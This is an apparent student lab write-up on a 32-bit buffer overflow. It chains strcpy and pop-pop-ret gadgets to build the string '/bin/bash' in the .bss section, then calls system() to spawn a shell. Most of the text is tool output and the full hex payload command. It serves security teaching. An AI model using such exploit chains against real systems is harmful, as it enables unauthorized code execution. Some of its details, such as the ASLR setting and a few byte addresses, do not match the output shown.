# Lab5_2 - Buffer overflow attack(turn on ASLR, turn on NX)

## Overview
* Previous lab, we use '/bin/sh' string in a environment in linux system. 
* This time, we're going to make '/bin/sh' string into a memory using strcpy and jump to the text!!!
* I think this is really cool and I truly admire who though these kind of things.

## PAYLOAD
+ Payload = PADDING + build-string-payload + &system() + &exit_path + &cmd_string
+ Note that, this time, we're building our own string!

## Before get started
+ Make sure that the ASLR is turned off.
```
[02/23/22]seed@VM:Byeongchan$ cat /proc/sys/kernel/randomize_va_space 
2
[02/23/22]seed@VM:Byeongchan$

```
+ Make sure not using stack executable when compiling c file
```
gcc -g -static -fno-stack-protector ans_check7.c -o ans_check7_static
```

## Steps
+ 1,2,3,4 - Have done on previous lab
5. Find out the address of the strcpy & pop-pop-ret function
6. Choose an address for our string destination
7. Find out where hexacode of strings are.(We're using them to build our own command)
8. Build the command text we're using
9. Make the payload and execute

### Step5 - Find out the address of the strcpy & pop-pop-ret function
+ We are interested in '__strcpy_ia32' so find and use the address of that label.
```
[03/02/22]seed@VM:Byeongchan$ objdump -D ans_check7_static | grep strcpy
0805b8b0 <strcpy>:
 805b8c0:	74 24                	je     805b8e6 <strcpy+0x36>
 805b8d2:	75 12                	jne    805b8e6 <strcpy+0x36>
 805b8de:	74 06                	je     805b8e6 <strcpy+0x36>
0805b8f0 <__strcpy_ia32>:
```
+ Find the address of a pop-pop-ret instruction sequence within the binary
```
[03/02/22]seed@VM:Byeongchan$ objdump -D ans_check7_static | grep -B3 ret | grep -A1 pop
.
.
.
--
 80bbc95:	5b                   	pop    %ebx
 80bbc96:	5e                   	pop    %esi
 80bbc97:	c3                   	ret

```

### Step6 - Choose an address for our string destination
+ Next, we will choose an address to serve as our string destination. 
+ Our chosen address needs to be stable, readable & writable, and capable of being safely overwritten. 
+ There are several address space locations we could choose, but in our example we will consider the 'bss' section of the address space.
```
[03/02/22]seed@VM:Byeongchan$ readelf -S ans_check7_static
There are 38 section headers, starting at offset 0xb317c:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .note.ABI-tag     NOTE            080480f4 0000f4 000020 00   A  0   0  4
  [ 2] .note.gnu.build-i NOTE            08048114 000114 000024 00   A  0   0  4
  [ 3] .rel.plt          REL             08048138 000138 000070 08  AI  0  24  4
  [ 4] .init             PROGBITS        080481a8 0001a8 000023 00  AX  0   0  4
  [ 5] .plt              PROGBITS        080481d0 0001d0 0000e0 00  AX  0   0 16
  [ 6] .text             PROGBITS        080482b0 0002b0 07305c 00  AX  0   0 16
  [ 7] __libc_freeres_fn PROGBITS        080bb310 073310 000abd 00  AX  0   0 16
  [ 8] __libc_thread_fre PROGBITS        080bbdd0 073dd0 0000a5 00  AX  0   0 16
  [ 9] .fini             PROGBITS        080bbe78 073e78 000014 00  AX  0   0  4
  [10] .rodata           PROGBITS        080bbea0 073ea0 01a90c 00   A  0   0 32
  [11] __libc_subfreeres PROGBITS        080d67ac 08e7ac 000028 00   A  0   0  4
  [12] .stapsdt.base     PROGBITS        080d67d4 08e7d4 000001 00   A  0   0  1
  [13] __libc_atexit     PROGBITS        080d67d8 08e7d8 000004 00   A  0   0  4
  [14] __libc_thread_sub PROGBITS        080d67dc 08e7dc 000004 00   A  0   0  4
  [15] .eh_frame         PROGBITS        080d67e0 08e7e0 012ca4 00   A  0   0  4
  [16] .gcc_except_table PROGBITS        080e9484 0a1484 0000b1 00   A  0   0  1
  [17] .tdata            PROGBITS        080eaf5c 0a1f5c 000010 00 WAT  0   0  4
  [18] .tbss             NOBITS          080eaf6c 0a1f6c 000018 00 WAT  0   0  4
  [19] .init_array       INIT_ARRAY      080eaf6c 0a1f6c 000008 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      080eaf74 0a1f74 000008 00  WA  0   0  4
  [21] .jcr              PROGBITS        080eaf7c 0a1f7c 000004 00  WA  0   0  4
  [22] .data.rel.ro      PROGBITS        080eaf80 0a1f80 000070 00  WA  0   0 32
  [23] .got              PROGBITS        080eaff0 0a1ff0 000008 04  WA  0   0  4
  [24] .got.plt          PROGBITS        080eb000 0a2000 000044 04  WA  0   0  4
  [25] .data             PROGBITS        080eb060 0a2060 000f20 00  WA  0   0 32
  [26] .bss              NOBITS          080ebf80 0a2f80 000f6c 00  WA  0   0 32
  [27] __libc_freeres_pt NOBITS          080eceec 0a2f80 000018 00  WA  0   0  4
  [28] .comment          PROGBITS        00000000 0a2f80 000034 01  MS  0   0  1
  [29] .note.stapsdt     NOTE            00000000 0a2fb4 000b54 00      0   0  4
  [30] .debug_aranges    PROGBITS        00000000 0a3b08 000020 00      0   0  1
  [31] .debug_info       PROGBITS        00000000 0a3b28 000330 00      0   0  1
  [32] .debug_abbrev     PROGBITS        00000000 0a3e58 0000eb 00      0   0  1
  [33] .debug_line       PROGBITS        00000000 0a3f43 0000d4 00      0   0  1
  [34] .debug_str        PROGBITS        00000000 0a4017 00026d 01  MS  0   0  1
  [35] .shstrtab         STRTAB          00000000 0b2fd1 0001a8 00      0   0  1
  [36] .symtab           SYMTAB          00000000 0a4284 007ff0 10     37 862  4
  [37] .strtab           STRTAB          00000000 0ac274 006d5d 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
```

### Step7 - Find out where hexacode of strings are.(We're using them to build our own command)
+ We're going to build '/bin/bash' string.
+ In our program, there are a lot of same string already.
+ Find out the addresses of the hexacodes below.
```
[03/02/22]seed@VM:Byeongchan$ readelf -x 10 ans_check7_static > a
[03/02/22]seed@VM:Byeongchan$ vi a
Hex dump of section '.rodata':
  0x080bbea0 03000000 01000200 666f7274 792d7477 ........forty-tw
  0x080bbeb0 6f005573 6167653a 20257320 3c616e73 o.Usage: %s <ans
  0x080bbec0 7765723e 0a005269 67687420 616e7377 wer>..Right answ
  0x080bbed0 65722100 57726f6e 6720616e 73776572 er!.Wrong answer
  0x080bbee0 21004162 6f757420 746f2065 78697421 !.About to exit!
  0x080bbef0 002f6269 6e2f6461 7465002e 2e2f6373 ./bin/date.../cs
  0x080bbf00 752f6c69 62632d73 74617274 2e630046 u/libc-start.c.F
  0x080bbf10 4154414c 3a206b65 726e656c 20746f6f ATAL: kernel too
  0x080bbf20 206f6c64 0a000000 5f5f6568 64725f73  old....__ehdr_s
  0x080bbf30 74617274 2e655f70 68656e74 73697a65 tart.e_phentsize
  0x080bbf40 203d3d20 73697a65 6f66202a 474c2864  == sizeof *GL(d
  0x080bbf50 6c5f7068 64722900 46415441 4c3a2063 l_phdr).FATAL: c
  0x080bbf60 616e6e6f 74206465 7465726d 696e6520 annot determine
  0x080bbf70 6b65726e 656c2076 65727369 6f6e0a00 kernel version..
  0x080bbf80 756e6578 70656374 65642072 656c6f63 unexpected reloc
  0x080bbf90 20747970 6520696e 20737461 74696320  type in static
  0x080bbfa0 62696e61 72790000 67656e65 7269635f binary..generic_
  0x080bbfb0 73746172 745f6d61 696e002f 6465762f start_main./dev/
  0x080bbfc0 66756c6c 002f6465 762f6e75 6c6c0000 full./dev/null..
```
+ These are what I found
```
/	2f	src_byte_addr_1 0x080bbef1, \xf1\xbe\x0b\x08
b	62	src_byte_addr_2 0x080bbef2, \xf2\xbe\x0b\x08
i	69	src_byte_addr_3	0x080bbff0, \xf0\xbf\x0b\x08
n	6e	src_byte_addr_4	0x080bbff1, \xf1\xbf\x0b\x08
a	61	src_byte_addr_7	0x080bbf60, \x60\xbf\x0b\x08
s	73	src_byte_addr_8	0x080bbfd0, \xd0\xbf\x0b\x08
h	68	src_byte_addr_9	0x080bbf53, \x53\xbf\x0b\x08
<null terminator>	0   0x080bbea1, \xa1\xbe\x0b\x08
```

### Step8 - Build the command text we're using
+ How to build the string?
+ Using strcpy in Libc library and we already found the address of strcpy function
+ If we put '&strcpy | &pop-pop-ret | str_loc_1 | src_byte_addr_1' into the return addres, we can make strcpy called.
+ Before move on, make sure to understand below
```
&strcpy : Jump to this address to exploit this string copy function.
&pop-pop-ret : It is needed to proceed to the next strcpy function. After executing strcpy function, it also look up returns address to execute next command. However, we put the address of pop-pop-ret, so the system calls pop-pop-ret function. And then, it pops the stack value twice and return and then, there is the place for address of another strcpy function.
str_loc_1 : The target address where ‘open the shell code command’ resides.
str_byte_addr_1 : The ascii code we want to copy.
```

### Step9 - Make the payload and execute
+ The payload I made is shown below
```
PADDING : build-string-payload | &system() | &exit_path | &cmd_string

&strcpy()
0x0805b8f0, \xf0\xb8\x05\x08

&pop-pop-ret()
0x80bbc95, \x95\xbc\x0b\x08

&system(): 
0x0804eef0, \xf0\xee\x04\x08

&exit()
0x0806cf93, \x93\xcf\x06\x08

&bss location 
0x080ebf91, \x91\xbf\x0e\x08


/	2f	src_byte_addr_1 0x080bbef1, \xf1\xbe\x0b\x08
b	62	src_byte_addr_2 0x080bbef2, \xf2\xbe\x0b\x08
i	69	src_byte_addr_3	0x080bbff0, \xf0\xbf\x0b\x08
n	6e	src_byte_addr_4	0x080bbff1, \xf1\xbf\x0b\x08
a	61	src_byte_addr_7	0x080bbf60, \x60\xbf\x0b\x08
s	73	src_byte_addr_8	0x080bbfd0, \xd0\xbf\x0b\x08
h	68	src_byte_addr_9	0x080bbf53, \x53\xbf\x0b\x08
<null terminator>	0   0x080bbea1, \xa1\xbe\x0b\x08

/ \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x91\xbf\x0e\x08\xf1\xbe\x0b\x08
b \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x92\xbf\x0e\x08\xf2\xbe\x0b\x08
i \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x93\xbf\x0e\x08\xf0\xbf\x0b\x08
n \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x94\xbf\x0e\x08\xf1\xbf\x0b\x08
/ \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x95\xbf\x0e\x08\xf1\xbe\x0b\x08
b \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x96\xbf\x0e\x08\xf2\xbe\x0b\x08
a \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x97\xbf\x0e\x08\x60\xbf\x0b\x08
s \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x98\xbf\x0e\x08\xd0\xbf\x0b\x08
h \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x99\xbf\x0e\x08\x53\xbf\x0b\x08
0 \xf0\xb8\x05\x08\x95\xbc\x0b\x08\x9a\xbf\x0e\x08\xa1\xbe\x0b\x08
system,     \xf0\xee\x04\x08
exit,       \x93\xcf\x06\x08
cmd_string, \x91\xbf\x0e\x08
```

```
[03/02/22]seed@VM:Byeongchan$ echo $$
2658
[03/02/22]seed@VM:Byeongchan$ ./ans_check7_static $(python -c "print '\x90'*54 + '\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x91\xbf\x0e\x08\xf1\xbe\x0b\x08\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x92\xbf\x0e\x08\xf2\xbe\x0b\x08\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x93\xbf\x0e\x08\xf0\xbf\x0b\x08\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x94\xbf\x0e\x08\xf1\xbf\x0b\x08\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x95\xbf\x0e\x08\xf1\xbe\x0b\x08\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x96\xbf\x0e\x08\xf2\xbe\x0b\x08\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x97\xbf\x0e\x08\x60\xbf\x0b\x08\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x98\xbf\x0e\x08\xd0\xbf\x0b\x08\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x99\xbf\x0e\x08\x53\xbf\x0b\x08\xf0\xb8\x05\x08\x95\xbc\x0b\x08\x9a\xbf\x0e\x08\xa1\xbe\x0b\x08\xf0\xee\x04\x08\x93\xcf\x06\x08\x91\xbf\x0e\x08'")
[03/02/22]seed@VM:Byeongchan$ echo $$
5049
[03/02/22]seed@VM:Byeongchan$ exit
exit
[03/02/22]seed@VM:Byeongchan$ echo $$
2658
[03/02/22]seed@VM:Byeongchan$
```
![lab5_2](https://raw.githubusercontent.com/kbckbc/washu_sp22_cse523/main/img/lab5_2.png)


